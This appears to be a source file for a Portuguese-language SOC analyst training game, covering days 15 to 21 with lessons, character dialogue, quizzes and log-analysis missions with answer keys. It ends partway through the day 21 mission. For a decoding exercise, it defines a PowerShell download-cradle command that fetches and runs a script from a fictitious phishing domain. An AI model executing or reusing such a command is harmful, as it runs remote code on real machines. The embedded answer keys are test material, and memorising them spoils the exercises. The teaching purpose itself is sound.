@@ -1,0 +1,385 @@
+import type { Dia } from '../../tipos';
+import { aula } from './comum';
+import { wafDia18, sysmonDia21 } from './registros';
+import { codificarBase64Utf16 } from '../../../motor/canivete';
+
+const COMANDO_DIA16 = "IEX (New-Object Net.WebClient).DownloadString('http://boletos-tabajara-2via.top/b.ps1')";
+
+export const DIAS_15_21: Dia[] = [
+  {
+    n: 15,
+    site: 'alfa',
+    turno: 'manhã',
+    titulo: 'A severidade da regra mente',
+    resumo: 'Prioridade é impacto vezes urgência. A severidade que veio no alerta é só o palpite de quem escreveu a regra.',
+    aula: aula(
+      'Severidade é atributo da **regra** ("PowerShell codificado = alta"). **Prioridade** é decisão sobre o **caso**, e no modelo clássico de gestão de serviços ela nasce de **impacto** (quanto do negócio é afetado: um notebook, um setor, o hospital inteiro) cruzado com **urgência** (quão rápido piora: está se espalhando? tem dado saindo agora?).',
+      'Uma matriz comum: **P1** impacto alto e urgência alta (ransomware se espalhando, conta de administrador do domínio comprometida); **P2** impacto alto ou urgência alta (servidor crítico com malware contido, phishing com cliques); **P3** impacto e urgência médios (estação isolada com adware); **P4** baixo (varredura bloqueada na borda). Cada contrato define os tempos de cada P; o SLA cobra com base nisso.',
+      'A severidade mente para os dois lados. Regra "crítica" disparando no laboratório de testes pode ser P4. Regra "baixa" de "novo serviço instalado" no controlador de domínio às 3h pode ser P1. O que muda a prioridade é o contexto: criticidade do ativo, privilégio da conta, sinais de propagação, dado sensível envolvido.',
+      'Ao subir ou baixar a prioridade, escreva o porquê no ticket ("rebaixado para P4: host de homologação sem dados, sem conexão externa"). Prioridade sem justificativa é só um número que alguém vai questionar na reunião de segunda, e na reunião de segunda o Chamadão está fora do ar.',
+    ),
+    chegada: [
+      { quem: 'gilmar', texto: 'Pessoal, a planilha mostra que 80% dos nossos tickets estão como P1. Isso é ótimo ou é péssimo?', gesto: 'pensar', expr: 'neutro' },
+      { quem: 'ro', texto: 'É a Brenda.', expr: 'neutro' },
+      { quem: 'brenda', texto: 'A regra veio crítica! Eu respeito a regra.', gesto: 'cintura' },
+      { quem: 'ro', texto: 'Se tudo é P1, nada é P1. Quando o hospital pegar fogo, vai estar na fila atrás da impressora da Tabajara.' },
+      { quem: 'pamela', texto: 'Eu sempre ajusto a prioridade pelo ativo e escrevo o motivo.', expr: 'neutro' },
+      { quem: 'gilmar', texto: 'Alguém deveria fazer isso. Anota aí: criar processo de ajuste de prioridade.', gesto: 'apontar' },
+      { quem: 'ro', texto: 'Ela acabou de descrever o processo, Gilmar.' },
+    ],
+    fila: { quantidade: 6 },
+    missoes: [
+      {
+        tipo: 'quiz',
+        titulo: 'P de quê?',
+        enunciado: 'Dê a prioridade certa para os casos que a Brenda marcou todos como P1.',
+        perguntas: [
+          {
+            p: 'Regra de severidade **crítica** "Mimikatz detectado" num servidor de homologação desligado da rede, que a equipe de pentest contratada usa, durante a janela do teste aprovada.',
+            opcoes: ['Baixa prioridade (P4), registrando a janela aprovada como evidência', 'P1, porque Mimikatz é crítico', 'P2, por precaução', 'Fechar sem registrar'],
+            certa: 0,
+            explicacao: 'A detecção é real, mas é benigna e esperada: pentest autorizado, em ambiente isolado, com janela aprovada. A severidade da regra não muda o contexto. Registrar a autorização é o que protege você.',
+          },
+          {
+            p: 'Regra de severidade **baixa** "Novo serviço instalado" (evento 7045) no controlador de domínio da prefeitura, às 3h, sem GMUD e com nome aleatório.',
+            opcoes: ['P1: ativo mais crítico do ambiente, fora de horário, sem mudança aprovada', 'P4, porque a regra é baixa', 'P3, porque é só um serviço', 'Esperar o horário comercial para perguntar à TI'],
+            certa: 0,
+            explicacao: 'Serviço novo com nome aleatório no controlador de domínio é padrão de movimento lateral ou persistência. Impacto máximo (é o AD inteiro) e urgência alta. A severidade "baixa" é palpite genérico da regra.',
+          },
+          {
+            p: 'Phishing reportado por 1 pessoa na Tabajara; ninguém clicou e a mensagem já foi removida das caixas.',
+            opcoes: ['P3 ou P4: impacto e urgência baixos, caso contido', 'P1, porque phishing é o vetor número 1', 'P2, porque pode ter mais gente', 'Não precisa de ticket'],
+            certa: 0,
+            explicacao: 'Sem clique, sem credencial digitada e com a mensagem removida, o caso está contido. Continua merecendo ticket e agradecimento a quem reportou. Se aparecer um clique, a prioridade sobe na hora.',
+          },
+          {
+            p: 'Por que escrever a justificativa ao alterar a prioridade?',
+            opcoes: ['Porque prioridade é decisão, e decisão sem motivo não se audita nem se repete', 'Porque o sistema exige um texto mínimo', 'Para o Gilmar ter o que ler', 'Não precisa, a prioridade fala por si'],
+            certa: 0,
+            explicacao: 'Quem revisar o ticket (cliente, auditoria, N2) precisa entender por que um alerta crítico virou P4 ou um baixo virou P1. É isso que diferencia critério de achismo.',
+          },
+        ],
+      },
+    ],
+    saida: [
+      { quem: 'brenda', texto: 'Rebaixei 40 tickets com justificativa. Me senti uma juíza.', gesto: 'comemorar', expr: 'sorriso' },
+      { quem: 'ro', texto: 'Juíza, não. Analista. Juíza ganha mais.', gesto: 'ombros' },
+    ],
+  },
+  {
+    n: 16,
+    site: 'alfa',
+    turno: 'tarde',
+    titulo: 'Base64 com sotaque de UTF-16',
+    resumo: 'PowerShell com -EncodedCommand: o que é, por que é suspeito e como ler sem executar.',
+    aula: aula(
+      'O PowerShell aceita o script inteiro em base64 pelo parâmetro `-EncodedCommand` (ou abreviações como `-enc`, `-e`, `-ec`). O detalhe que todo analista precisa decorar: o texto é codificado em **UTF-16LE** antes do base64. Por isso o base64 de comando PowerShell tem cara de `SQBFAFgA...`, com muitos `A` alternados: são os bytes zero do UTF-16.',
+      'Os parâmetros que costumam vir junto: `-NoP` (NoProfile), `-W Hidden` (janela oculta), `-NonI` (não interativo), `-Exec Bypass` (ignora a política de execução). Nenhum deles é malicioso sozinho, e ferramentas legítimas de gerenciamento também usam `-EncodedCommand`. O que pesa é o conjunto: processo pai estranho, usuário comum, conteúdo que baixa e executa algo da internet. ATT&CK: T1059.001 (PowerShell) e T1027 (ofuscação).',
+      'Para decodificar no Canivete: **base64** e depois **utf16le**. Nunca rode o comando para ver o que ele faz. Se o resultado tiver outra camada (outro base64, compressão, string invertida), continue decodificando. Procure URL, domínio, IP, nome de arquivo e caminho: esses viram IOCs no ticket, sempre "defangados" (`hxxp://`, `[.]`) para ninguém clicar sem querer.',
+      'Do lado das fontes, o **evento 4104** (Script Block Logging, no log Microsoft-Windows-PowerShell/Operational) registra o script já decodificado, e o 4103 registra módulos. Sysmon 1 e o 4688 (com linha de comando habilitada) mostram a linha de comando original. Se o cliente não tem 4104 ligado, recomende: é de graça e já salvou muita madrugada.',
+    ),
+    chegada: [
+      { quem: 'keyla', texto: 'A minha regra de PowerShell codificado pegou uma coisa! Uma coisa de verdade! Não é a ferramenta de inventário dessa vez!', gesto: 'comemorar', expr: 'surpresa' },
+      { quem: 'ro', texto: 'Anota a data. Isso não acontece todo ano.', expr: 'sorriso' },
+      { quem: 'kevin', texto: 'Eu ia copiar e colar o comando no meu PowerShell pra ver o que fazia.', gesto: 'ombros' },
+      { quem: 'vandeco', texto: 'Garoto, isso é igual cheirar o frasco pra ver se é veneno. Decodifica no Canivete. Lê. Não roda.', expr: 'bravo' },
+      { quem: 'vandeco', texto: 'Em 2003 ninguém codificava nada. O vírus vinha escrito "SOU UM VÍRUS". Era mais honesto.', gesto: 'pensar' },
+    ],
+    fila: { quantidade: 7 },
+    missoes: [
+      {
+        tipo: 'decodificar',
+        titulo: 'Os A alternados',
+        enunciado: `O Sentinela EDR registrou na estação DT-CAIXA-05 da Tabajara:\n\n\`powershell.exe -NoP -NonI -W Hidden -Enc ${codificarBase64Utf16(COMANDO_DIA16)}\`\n\nDecodifique no Canivete e descubra para onde o comando quer ir.`,
+        entrada: codificarBase64Utf16(COMANDO_DIA16),
+        receita: ['base64', 'utf16le'],
+        pergunta: 'Qual domínio o comando tenta acessar?',
+        resposta: 'boletos-tabajara-2via.top',
+        explicacao: 'Base64 e depois UTF-16LE revelam um "download cradle": o comando baixa um script de `hxxp://boletos-tabajara-2via[.]top/b.ps1` e executa direto na memória com `IEX` (Invoke-Expression), sem gravar arquivo no disco. IOCs para o ticket: o domínio defangado, a URL e a linha de comando. Ação: escalar como verdadeiro positivo, pedir isolamento conforme o playbook e procurar o mesmo domínio no proxy e no DNS de outras máquinas.',
+      },
+    ],
+    saida: [
+      { quem: 'keyla', texto: 'Posso emoldurar esse alerta?', gesto: 'pensar', expr: 'sorriso' },
+      { quem: 'gilmar', texto: 'Pode, desde que o ticket esteja fechado antes do Tomatinho tocar.' },
+    ],
+  },
+  {
+    n: 17,
+    site: 'alfa',
+    turno: 'manhã',
+    titulo: 'A pirâmide que dói',
+    resumo: 'IOCs e a Pirâmide da Dor: por que bloquear hash é fácil e bloquear comportamento é o que machuca o atacante.',
+    aula: aula(
+      '**IOC** (indicador de comprometimento) é um artefato observável que indica atividade maliciosa: hash de arquivo, IP, domínio, URL, nome de arquivo, chave de registro, user-agent. IOC é útil para bloquear e para buscar retroativamente ("quem mais falou com esse domínio nos últimos 30 dias?").',
+      'A **Pirâmide da Dor**, proposta por David Bianco em 2013, ordena os indicadores pelo quanto custa ao atacante trocá-los. De baixo para cima: **valores de hash** (trivial, recompila e pronto), **endereços IP** (fácil), **nomes de domínio** (simples, um pouco mais chato), **artefatos de rede e de host** (incômodo: user-agent fixo, caminho de pipe nomeado, padrão de URL), **ferramentas** (desafiador: reescrever a ferramenta) e **TTPs** (difícil: mudar o jeito de operar).',
+      'Na prática: bloquear o hash de ontem ajuda hoje e não ajuda amanhã. Detectar "Word criando PowerShell", que é um comportamento (TTP), pega o ataque de hoje, de amanhã e do ano que vem, com qualquer hash e qualquer domínio. É por isso que engenharia de detecção sobe a pirâmide.',
+      'IOC tem prazo de validade. IP de nuvem muda de dono, domínio expira e é comprado por outra pessoa. Lista de bloqueio com 200 mil IPs de 2019 é um museu, não uma defesa. Ao registrar IOCs, anote fonte, data e contexto.',
+    ),
+    chegada: [
+      { quem: 'jefferson', texto: 'Pirâmide da Dor parece nome de questão de concurso de Educação Física.', gesto: 'pensar' },
+      { quem: 'vandeco', texto: 'É a coisa mais útil que alguém já desenhou para o nosso trabalho. E é um triângulo. Até o Gilmar entende.', expr: 'sorriso' },
+      { quem: 'gilmar', texto: 'Eu ouvi isso.', expr: 'bravo' },
+      { quem: 'vandeco', texto: 'Era um elogio, chefe. Triângulo é uma planilha com ambição.', gesto: 'ombros' },
+      { quem: 'keyla', texto: 'Minha meta é escrever uma regra no topo da pirâmide.' },
+      { quem: 'ro', texto: 'Comece saindo do porão, Keyla. Sua regra de ontem era um hash.' },
+    ],
+    fila: { quantidade: 7 },
+    missoes: [
+      {
+        tipo: 'quiz',
+        titulo: 'Subindo a pirâmide',
+        enunciado: 'O Vandeco desenhou a pirâmide no quadro branco com caneta que não apaga. Agora ela é permanente. Responda.',
+        perguntas: [
+          {
+            p: 'Qual indicador fica na **base** da Pirâmide da Dor, ou seja, é o mais fácil para o atacante trocar?',
+            opcoes: ['Valor de hash do arquivo', 'Domínio do C2', 'Ferramenta usada', 'TTP'],
+            certa: 0,
+            explicacao: 'Mudar um byte do arquivo gera hash novo. Hash é ótimo para confirmar que dois arquivos são iguais e péssimo como defesa de longo prazo.',
+          },
+          {
+            p: 'O atacante usa sempre o mesmo user-agent estranho nas conexões de C2, mesmo trocando de domínio. Em que nível da pirâmide esse indicador está?',
+            opcoes: ['Artefatos de rede e de host', 'Endereço IP', 'Valor de hash', 'TTP'],
+            certa: 0,
+            explicacao: 'User-agent, padrão de URL e nome de pipe são artefatos: ficam acima de domínio e IP porque trocá-los exige mexer na ferramenta ou na configuração, e isso incomoda.',
+          },
+          {
+            p: 'Qual detecção dói mais no atacante?',
+            opcoes: ['Alertar quando processo do Office cria um interpretador de comandos (PowerShell, cmd, wscript)', 'Bloquear o hash do anexo desta campanha', 'Bloquear os 3 IPs de C2 de ontem', 'Bloquear o domínio do C2 de ontem'],
+            certa: 0,
+            explicacao: 'Detectar o comportamento pega qualquer variação da técnica, com qualquer anexo e qualquer infraestrutura. Os bloqueios de baixo também valem, mas são curativo.',
+          },
+          {
+            p: 'O cliente quer bloquear no firewall uma lista de 200 mil IPs maliciosos de 2019. Melhor resposta:',
+            opcoes: ['IOC envelhece; prefira fontes atualizadas, com data e contexto, e invista em detecção de comportamento', 'Ótima ideia, quanto mais IPs melhor', 'Bloquear só os IPs brasileiros da lista', 'Bloquear a internet inteira e liberar sob demanda'],
+            certa: 0,
+            explicacao: 'IPs de 2019 hoje podem ser de serviços legítimos, inclusive de nuvem que o próprio cliente usa. Lista velha gera falso positivo e falsa sensação de segurança.',
+          },
+        ],
+      },
+    ],
+    saida: [
+      { quem: 'neide', texto: 'Vou ter que limpar esse triângulo com álcool. Mas vou deixar a parte de cima, que parece importante.', gesto: 'apontar', expr: 'sorriso' },
+    ],
+  },
+  {
+    n: 18,
+    site: 'alfa',
+    turno: 'noite',
+    titulo: 'Black Friday do sonho',
+    resumo: 'A padaria vende sonho com 70% de desconto e os bots vendem senha vazada. WAF, bots e credential stuffing.',
+    evento: 'black_friday',
+    aula: aula(
+      'O **WAF** (Web Application Firewall) fica na frente da aplicação web e registra cada requisição: IP, método, URL, código de status, user-agent, país e a regra que bloqueou ou deixou passar. Ele protege contra injeção, XSS e abuso de aplicação, e ajuda a separar gente de robô.',
+      '**Credential stuffing** (T1110.004) é usar pares de e-mail e senha vazados de outros sites, porque as pessoas repetem senha. O que se vê no log: muitas falhas (401) no endpoint de login, **muitos usuários diferentes**, vindo de **muitos IPs** (botnet ou proxy residencial) e, muito frequentemente, o **mesmo user-agent** ou a mesma impressão digital do cliente HTTP. Taxa de sucesso baixa, mas não zero: cada 200 no meio da enxurrada é uma conta tomada.',
+      'Em data de pico (Black Friday, Dia das Mães), o tráfego legítimo também explode, então volume sozinho não diz nada. Separe pelo comportamento: o humano navega (produto, carrinho, checkout); o robô vai direto no `/conta/login` e não compra nem um sonho.',
+      'Resposta típica: rate limiting por IP e por conta, desafio para clientes suspeitos, bloqueio do padrão de user-agent, **reset de senha e encerramento de sessão** das contas que tiveram sucesso a partir do padrão do bot, e aviso ao titular. No Vigia: `url=/conta/login status=401 | contar por user_agent | ordenar -total` acha a assinatura do robô.',
+    ),
+    chegada: [
+      { quem: 'narrador', texto: 'Sexta-feira, 22h. A Padaria Pão de Ló Digital anunciou sonho de creme com 70% de desconto. O e-commerce recebeu mais visitas que o site da Receita em maio.' },
+      { quem: 'chat', texto: 'Padaria (TI): está tudo lento, mas está vendendo! Por favor, não bloqueiem NADA. Nada. É Black Friday.' },
+      { quem: 'gilmar', texto: 'Plano de guerra: ninguém sai, pizza por conta da empresa, e o Tomatinho fica no modo turbo.', gesto: 'cintura' },
+      { quem: 'ro', texto: 'A pizza é do mesmo fornecedor do ano passado?', expr: 'neutro' },
+      { quem: 'gilmar', texto: 'É a de calabresa com ketchup. Licitação.' },
+      { quem: 'nildo', texto: 'Aqui de Recife a gente tá vendo o mesmo tráfego, visse? Se precisar de ajuda é só chamar o SOC de verdade.', gesto: 'acenar', expr: 'sorriso' },
+      { quem: 'ro', texto: 'O Nildo liga toda Black Friday só para dizer isso.' },
+    ],
+    fila: { quantidade: 7 },
+    missoes: [
+      {
+        tipo: 'siem',
+        titulo: 'Quem não compra sonho',
+        enunciado: 'O WAF da padaria registrou a primeira hora da madrugada de Black Friday. No meio de clientes reais, tem um robô testando senha vazada. Descubra qual conta o robô conseguiu acessar.',
+        registros: wafDia18(),
+        pergunta: 'Qual conta teve login bem-sucedido (200) feito pelo robô de credential stuffing?',
+        resposta: 'regina.prado@exemplo.com.br',
+        gabarito: 'url=/conta/login status=200 user_agent=*Firefox/45.0* | tabela hora,usuario,ip_origem,user_agent',
+        dica: 'Primeiro ache a assinatura do robô: `url=/conta/login status=401 | contar por user_agent | ordenar -total`. Depois procure sucesso com aquele user-agent usando curinga: `url=/conta/login status=200 user_agent=*Firefox/45.0*`.',
+        explicacao: 'O robô usou 25 IPs de vários países, mas o mesmo user-agent de um Firefox de 2016, e foi direto no login, sem passar por produto nem carrinho. Em 70 tentativas falhas, uma deu certo: `regina.prado@exemplo.com.br`, às 01:13. Ação: encerrar a sessão, forçar troca de senha, avisar a titular e pedir rate limiting e desafio para aquele padrão. Sem bloquear a padaria inteira, como a TI pediu com tanto carinho.',
+      },
+    ],
+    saida: [
+      { quem: 'chat', texto: 'Padaria (TI): vendemos 14 mil sonhos e perdemos só uma conta. É recorde nas duas coisas.' },
+      { quem: 'vandeco', texto: 'O de creme tá bom. A pizza de calabresa com ketchup eu vou reportar como incidente.', gesto: 'nao', expr: 'bravo' },
+    ],
+  },
+  {
+    n: 19,
+    site: 'alfa',
+    turno: 'madrugada',
+    titulo: 'Meu jovem, são 3h da manhã',
+    resumo: 'O Dr. Leôncio liga de madrugada. Falar com cliente também é técnica.',
+    evento: 'plantao',
+    aula: aula(
+      'Falar com cliente em crise é técnica. Primeiro, **confirme quem está do outro lado** pelo procedimento do contrato (contato cadastrado, retorno para o número oficial, palavra-chave). Golpista também liga para o SOC fingindo ser diretor. Depois **acalme**: tom firme, frases curtas, sem jargão.',
+      '**Colete fatos** com perguntas abertas e objetivas: o que você clicou, quando, em qual dispositivo, digitou senha onde, o que apareceu na tela, alguém mais recebeu. Anote horário e palavras do cliente no ticket enquanto ele fala. O cliente em pânico lembra das coisas uma vez só.',
+      '**Oriente o que é seguro e está no playbook**: trocar a senha a partir de outro dispositivo, não desligar a máquina (desligar apaga evidência da memória), desconectar da rede se o playbook mandar, não apagar o e-mail. **Nunca peça a senha do cliente**, nem "só para conferir". E não prometa o que você não controla ("está tudo resolvido", "não vazou nada").',
+      'Feche a ligação com combinado claro: número do ticket, o que o SOC vai fazer agora, quando o cliente terá retorno e quem vai ligar. Depois escale. Cliente que ouve "vou acionar o especialista e te ligo até as 4h" dorme. Cliente que ouve "acho que não é nada" liga de novo às 3h15.',
+    ),
+    chegada: [
+      { quem: 'narrador', texto: '3h02. O SOC está silencioso, só o zumbido do videowall. O telefone do plantão toca. No identificador: "COOP BOI GORDO DIRETORIA".' },
+      { quem: 'telefone', texto: 'Dr. Leôncio: Meu jovem! Graças a Deus. Chegou um e-mail do banco dizendo que minha conta ia ser bloqueada, eu cliquei, coloquei a senha e agora a tela ficou azul. Não a tela da morte, um azul bonito, do banco.' },
+      { quem: 'voce', texto: 'Doutor, o senhor colocou a senha de onde?' },
+      { quem: 'telefone', texto: 'Dr. Leôncio: Do e-mail da cooperativa. E do banco. É a mesma, meu jovem, para não esquecer. É o nome do meu cavalo com o ano que ele nasceu.' },
+      { quem: 'thiaguinho', texto: '(cochichando) Eu sempre falo pra ele que vai dar bom e desligo. Funciona até a próxima ligação.', gesto: 'ombros' },
+    ],
+    fila: { quantidade: 7 },
+    missoes: [
+      {
+        tipo: 'escolha',
+        titulo: 'O cavalo e a senha',
+        enunciado: 'O Dr. Leôncio está nervoso, na linha, às 3h. Ele digitou a senha do e-mail e do banco numa página falsa. O que você faz?',
+        opcoes: [
+          {
+            texto: 'Confirmar a identidade pelo procedimento do contrato, coletar os fatos, orientar a troca de senha por outro dispositivo e ligar para o banco, abrir ticket e escalar.',
+            reacao: [
+              { quem: 'voce', texto: 'Doutor, vou confirmar seu cadastro e te fazer quatro perguntas rápidas. Depois o senhor troca a senha do e-mail pelo celular e liga para o banco pelo número do cartão. Ticket aberto, retorno até as 4h.' },
+              { quem: 'telefone', texto: 'Dr. Leôncio: Que coisa organizada, meu jovem. Parece até que vocês sabem o que estão fazendo.' },
+              { quem: 'vandeco', texto: '(no chat) Recebi o escalonamento. Ticket impecável. Vou revogar as sessões do e-mail dele agora.', expr: 'sorriso' },
+            ],
+            efeitos: { reputacao: 10, energia: -10 },
+          },
+          {
+            texto: 'Tranquilizar: "o antivírus premium do senhor cobre isso, pode dormir".',
+            reacao: [
+              { quem: 'telefone', texto: 'Dr. Leôncio: Eu sabia! É seguro, eu falei para a minha esposa.' },
+              { quem: 'narrador', texto: 'Às 5h40, alguém entrou no e-mail da diretoria da cooperativa e criou uma regra que encaminha tudo com a palavra "boleto" para fora.' },
+              { quem: 'ro', texto: 'Promessa que a gente não controla é dívida. E quem cobra é o cliente, com juros.', expr: 'bravo' },
+            ],
+            efeitos: { reputacao: -10, sanidade: -5 },
+          },
+          {
+            texto: 'Dizer que o atendimento por telefone é só em horário comercial e pedir para ele mandar e-mail.',
+            reacao: [
+              { quem: 'telefone', texto: 'Dr. Leôncio: Mandar e-mail? Do e-mail que eu acabei de entregar para o bandido?' },
+              { quem: 'gilmar', texto: '(de manhã) O contrato da cooperativa é 24x7. O plantão existe exatamente para isso. Vamos conversar sobre o que significa "SOC".', gesto: 'cruzar', expr: 'bravo' },
+            ],
+            efeitos: { reputacao: -15 },
+          },
+          {
+            texto: 'Pedir a senha para "conferir se é forte o suficiente".',
+            reacao: [
+              { quem: 'telefone', texto: 'Dr. Leôncio: É Pé de Pano mais o... espera. O banco disse que nunca pede senha. Vocês pedem?' },
+              { quem: 'ro', texto: 'Ele estava certo pela primeira vez na vida e você estava errado. Nunca, jamais, em hipótese nenhuma, a senha do cliente.', expr: 'bravo' },
+            ],
+            efeitos: { reputacao: -20, sanidade: -10 },
+          },
+        ],
+      },
+    ],
+    saida: [
+      { quem: 'telefone', texto: 'Dr. Leôncio: Obrigado, meu jovem. Amanhã eu mando uma caixa de queijo para vocês.' },
+      { quem: 'thiaguinho', texto: 'Ele nunca mandou queijo pra mim.', expr: 'triste' },
+    ],
+  },
+  {
+    n: 20,
+    site: 'alfa',
+    turno: 'manhã',
+    titulo: 'O Word que tinha filhos',
+    resumo: 'Macro do Office: quando winword.exe vira pai de powershell.exe, a família tem um problema.',
+    aula: aula(
+      'Phishing com anexo (T1566.001) costuma usar documento com **macro** (`.docm`, `.xlsm`, ou `.doc` antigo) e convencer a pessoa a clicar em "Habilitar conteúdo". A macro executa e chama um interpretador: `powershell.exe`, `cmd.exe`, `wscript.exe`, `mshta.exe`, `rundll32.exe`. A execução pelo usuário é a T1204.002.',
+      'No **Sysmon evento 1** (criação de processo), os campos que contam a história são `Image` (o processo criado), `CommandLine`, `ParentImage` (quem criou), `ParentCommandLine` (com qual arquivo o pai foi aberto), `User` e `Hashes`. `ParentImage` terminando em `WINWORD.EXE`, `EXCEL.EXE` ou `OUTLOOK.EXE` com filho interpretador é um dos sinais mais confiáveis que existem.',
+      'Do lado da defesa, a Microsoft tem a regra de redução de superfície de ataque (**ASR**) "Bloquear todos os aplicativos do Office de criar processos filho", e as macros vindas da internet (com marca de origem, a Mark of the Web) são bloqueadas por padrão nas versões atuais do Office. Quando o cliente desliga isso "porque a planilha da contabilidade parou", anote no relatório.',
+      'Triagem: o documento veio de onde (e-mail, download)? O filho rodou com que linha de comando? Houve conexão externa ou arquivo gravado depois? Outros usuários receberam o mesmo anexo? N1 escala com evidência e pede isolamento conforme playbook. E **não abra o documento** na sua máquina para "dar uma olhadinha".',
+    ),
+    chegada: [
+      { quem: 'keyla', texto: 'Regra nova: "Office com filho suspeito". Ela é perfeita. Ela é linda. Ela só disparou três vezes em uma semana.', gesto: 'comemorar', expr: 'sorriso' },
+      { quem: 'ro', texto: 'Três vezes? Quem é você e o que fez com a Keyla?', expr: 'surpresa' },
+      { quem: 'keyla', texto: 'Aprendi com a pirâmide. E com vocês.', expr: 'sorriso' },
+      { quem: 'jefferson', texto: 'Isso cai em prova: processo pai e processo filho. A família é o Word e o filho rebelde é o PowerShell.', gesto: 'pensar' },
+      { quem: 'vandeco', texto: 'Em 1999 era o Melissa. Macro do Word mandando e-mail para os 50 primeiros contatos. Derrubou servidor de e-mail no mundo inteiro. A família Word tem histórico.' },
+    ],
+    fila: { quantidade: 7 },
+    missoes: [
+      {
+        tipo: 'quiz',
+        titulo: 'Árvore genealógica do processo',
+        enunciado: 'Um dos três disparos da regra nova da Keyla veio do notebook da Camila, da Tabajara. Leia o evento Sysmon anexado.',
+        anexo: [
+          'Log Name:      Microsoft-Windows-Sysmon/Operational',
+          'Event ID:      1 (Process Create)',
+          'UtcTime:       2026-03-24 13:02:17.441',
+          'Computer:      NB-COM-022.tabajara.local',
+          'User:          TABAJARA\\camila.ribeiro',
+          'Image:         C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
+          'CommandLine:   powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
+          'CurrentDirectory: C:\\Users\\camila.ribeiro\\Documents\\',
+          'IntegrityLevel: Medium',
+          'Hashes:        SHA256=(hash da Microsoft, assinado)',
+          'ParentImage:   C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
+          'ParentCommandLine: "WINWORD.EXE" /n "C:\\Users\\camila.ribeiro\\Downloads\\Apolice_Renovacao_2026.docm" /o ""',
+        ].join('\n'),
+        perguntas: [
+          {
+            p: 'O hash do powershell.exe é o original da Microsoft, assinado. Isso torna o evento benigno?',
+            opcoes: ['Não: o binário é legítimo, o problema é quem o chamou e com que comando', 'Sim: arquivo assinado é confiável', 'Sim: o IntegrityLevel é Medium', 'Não dá para saber sem subir o PowerShell num site de análise'],
+            certa: 0,
+            explicacao: 'Atacantes usam ferramentas do próprio sistema (living off the land). O powershell.exe é sempre legítimo; o que importa é o pai (WINWORD.EXE), os parâmetros ocultos e o conteúdo codificado.',
+          },
+          {
+            p: 'Qual campo prova que foi o documento que disparou o PowerShell?',
+            opcoes: ['ParentImage e ParentCommandLine, que mostram o Word abrindo Apolice_Renovacao_2026.docm', 'CurrentDirectory', 'IntegrityLevel', 'Computer'],
+            certa: 0,
+            explicacao: 'ParentImage mostra o pai (Word) e ParentCommandLine mostra qual arquivo ele tinha aberto. A extensão .docm indica documento com macro habilitada.',
+          },
+          {
+            p: 'Qual técnica do MITRE ATT&CK descreve melhor a entrada desse ataque?',
+            opcoes: ['T1566.001, Spearphishing Attachment', 'T1110.003, Password Spraying', 'T1046, Network Service Discovery', 'T1071.004, DNS'],
+            certa: 0,
+            explicacao: 'A entrada foi um anexo malicioso. Depois vêm T1204.002 (usuário executou o arquivo) e T1059.001 (PowerShell). Um alerta bom mapeia a cadeia, não só uma técnica.',
+          },
+          {
+            p: 'Qual é a melhor ação do N1 agora?',
+            opcoes: ['Escalar como verdadeiro positivo com o evento, decodificar o -Enc para extrair IOCs e pedir isolamento conforme o playbook', 'Abrir o .docm na sua máquina para ver a macro', 'Fechar: o antivírus não alertou', 'Mandar e-mail para a Camila perguntando se ela clicou'],
+            certa: 0,
+            explicacao: 'Evidência forte, escalonamento rápido, IOCs extraídos com segurança. Perguntar à usuária faz parte, mas pelo canal do cliente e depois de acionar a contenção; e e-mail pode estar comprometido.',
+          },
+        ],
+      },
+    ],
+    saida: [
+      { quem: 'keyla', texto: 'Três disparos, um verdadeiro positivo. Isso é 33% de precisão! É o meu recorde!', gesto: 'comemorar', expr: 'sorriso' },
+      { quem: 'ro', texto: 'Comparado com a V7, é um milagre. Vou acender uma vela.', gesto: 'sim' },
+    ],
+  },
+  {
+    n: 21,
+    site: 'alfa',
+    turno: 'tarde',
+    titulo: 'Sysmon, o fofoqueiro do Windows',
+    resumo: 'Os eventos 1, 3, 11, 13 e 22 do Sysmon contam uma história inteira, se você souber ligar os pontos.',
+    aula: aula(
+      'O **Sysmon** (da Sysinternals, da Microsoft) registra o que o log padrão do Windows não conta. Os eventos que mais aparecem no SOC: **1** criação de processo (com linha de comando, pai e hash), **3** conexão de rede (processo, IP e porta de destino), **11** criação de arquivo (TargetFilename), **13** valor de registro alterado (TargetObject, onde mora a persistência em `...\\CurrentVersion\\Run`) e **22** consulta DNS (QueryName, por processo).',
+      'Outros que valem decorar: **7** imagem carregada (DLL), **8** CreateRemoteThread (injeção), **10** acesso a processo (quem abriu a memória do `lsass.exe`), **12** criação e exclusão de chave de registro. Sysmon depende de uma boa configuração: sem config, ele registra pouco ou registra demais.',
+      'O valor está em **ligar os eventos pelo processo**: o arquivo nasceu (11), foi executado (1), perguntou um nome (22), conectou (3) e se instalou para sobreviver ao reinício (13). Cada evento sozinho parece pouco; em sequência, no mesmo host e em segundos, é uma intrusão contada em cinco atos.',
+      'Lugares onde executável legítimo raramente nasce e roda: `AppData\\Local\\Temp`, `Downloads`, `C:\\Users\\Public`, `C:\\ProgramData`. No Vigia, curinga funciona em caminhos: `evento=3 processo=*\\Temp\\*` mostra conexões de qualquer coisa rodando da pasta Temp. E nem todo Run é ruim: o OneDrive também se coloca lá, porque o OneDrive acha que é dono do seu computador.',
+    ),
+    chegada: [
+      { quem: 'pamela', texto: 'O RH da Tabajara recebeu um "currículo" em .exe. Chegou pelo Outlook.', expr: 'neutro' },
+      { quem: 'kevin', texto: 'Currículo em .exe é o candidato mostrando que sabe programar. Contrataria.', gesto: 'ombros', expr: 'sorriso' },
+      { quem: 'ro', texto: 'Kevin, você vai ser o exemplo de todas as minhas aulas até eu me aposentar.', expr: 'bravo' },
+      { quem: 'vandeco', texto: 'O Sysmon tá ligado nessa máquina? Então a gente tem a novela completa. É só assistir na ordem.', gesto: 'pensar' },
+      { quem: 'pamela', texto: 'Tá ligado. Eu já filtrei o host. Posso mostrar?' },
+      { quem: 'ro', texto: 'Pode, Pâmela. Gente, prestem atenção nela. Estou falando sério dessa vez.', gesto: 'apontar' },
+    ],
+    fila: { quantidade: 7 },
+    missoes: [
+      {
+        tipo: 'siem',
+        titulo: 'Novela em cinco eventos',
+        enunciado: 'Você tem os eventos Sysmon de três estações da Tabajara, incluindo o NB-RH-007, da Ana, que abriu o "currículo". Siga a história do executável que nasceu na pasta Temp.',
+        registros: sysmonDia21(),
+        pergunta: 'Para qual IP o executável que rodou a partir da pasta Temp abriu conexão?',
